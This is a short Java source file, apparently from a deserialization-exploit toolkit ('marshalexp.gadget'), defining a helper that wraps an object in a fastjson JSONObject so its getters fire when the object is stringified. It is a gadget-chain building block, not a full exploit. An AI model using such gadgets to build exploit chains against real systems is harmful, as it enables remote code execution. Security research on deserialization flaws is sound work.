package xyz.eki.marshalexp.gadget.fastjson;

import com.alibaba.fastjson.JSONObject;

public class GFastJson {
    public static JSONObject toString2Getter(Object obj){
        JSONObject gadget = new JSONObject();
        gadget.put("eki",obj);
        return gadget;
    }
}
